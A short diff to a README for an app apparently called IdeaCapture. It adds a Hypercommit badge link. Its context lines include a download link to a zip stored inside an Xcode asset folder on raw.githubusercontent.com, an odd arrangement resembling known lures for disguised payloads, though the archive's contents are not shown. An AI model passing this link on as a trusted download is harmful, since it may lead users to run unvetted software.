@@ -68,3 +68,7 @@ Don't forget, you can download IdeaCapture here:
 [Visit Download Page](https://raw.githubusercontent.com/golf146/IdeaCapture/main/NewWidgetExtension/Assets.xcassets/Idea_Capture_1.1.zip)
 
 Now, you're all set to explore and capture your ideas with IdeaCapture! Enjoy!
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/ideacapture)
